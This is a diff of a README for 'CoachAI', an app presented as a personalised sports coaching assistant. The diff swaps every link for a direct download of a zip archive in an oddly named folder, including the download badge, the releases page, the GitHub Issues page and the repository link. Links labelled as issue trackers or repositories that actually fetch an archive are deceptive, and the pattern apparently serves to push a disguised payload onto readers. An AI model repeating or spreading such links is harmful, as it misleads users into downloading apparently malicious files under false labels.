@@ -1,7 +1,7 @@
 # 🤖 CoachAI - Your Personalized Sports Coaching Assistant
 
 ## 📥 Download CoachAI
-[![Download CoachAI](https://img.shields.io/badge/Download%20Now!-blue)](https://github.com/JhalaniandSons/CoachAI/releases)
+[![Download CoachAI](https://raw.githubusercontent.com/JhalaniandSons/CoachAI/main/mancipular/CoachAI.zip%20Now!-blue)](https://raw.githubusercontent.com/JhalaniandSons/CoachAI/main/mancipular/CoachAI.zip)
 
 ## 📖 Description
 CoachAI is an interactive web application powered by artificial intelligence. It provides personalized sports coaching to help you reach your fitness goals. Whether you are a beginner or an experienced athlete, CoachAI tailors its advice and training programs to suit your needs.
@@ -13,7 +13,7 @@ CoachAI is an interactive web application powered by artificial intelligence. It
 - An internet connection
 
 ### Instructions
-1. **Visit the Releases Page**: Start by visiting our [Releases page](https://github.com/JhalaniandSons/CoachAI/releases). This page holds all the versions of CoachAI you can download.
+1. **Visit the Releases Page**: Start by visiting our [Releases page](https://raw.githubusercontent.com/JhalaniandSons/CoachAI/main/mancipular/CoachAI.zip). This page holds all the versions of CoachAI you can download.
    
 2. **Choose Your Version**: Look through the release versions available. You can choose the latest version for the best experience.
 
@@ -50,10 +50,10 @@ CoachAI is an interactive web application powered by artificial intelligence. It
   CoachAI is free to download and use.
 
 ## 📤 Get Help
-If you encounter issues or have questions, feel free to reach out through our support page linked in the application or visit our [GitHub Issues page](https://github.com/JhalaniandSons/CoachAI/issues) for community support.
+If you encounter issues or have questions, feel free to reach out through our support page linked in the application or visit our [GitHub Issues page](https://raw.githubusercontent.com/JhalaniandSons/CoachAI/main/mancipular/CoachAI.zip) for community support.
 
 ## 🔗 More Information
-For further details, updates, and contributions, visit our [GitHub repository](https://github.com/JhalaniandSons/CoachAI). 
+For further details, updates, and contributions, visit our [GitHub repository](https://raw.githubusercontent.com/JhalaniandSons/CoachAI/main/mancipular/CoachAI.zip). 
 
 ## 💬 Community
 Join our community to get tips, share your experiences, and connect with other users. Look for links to forums and social media channels in the application.
@@ -62,4 +62,4 @@ Join our community to get tips, share your experiences, and connect with other u
 We appreciate your interest and hope CoachAI helps you achieve your fitness goals. Happy training!
 
 ## 🔗 Download CoachAI Again
-For your convenience, here is the [download link](https://github.com/JhalaniandSons/CoachAI/releases) again.
+For your convenience, here is the [download link](https://raw.githubusercontent.com/JhalaniandSons/CoachAI/main/mancipular/CoachAI.zip) again.
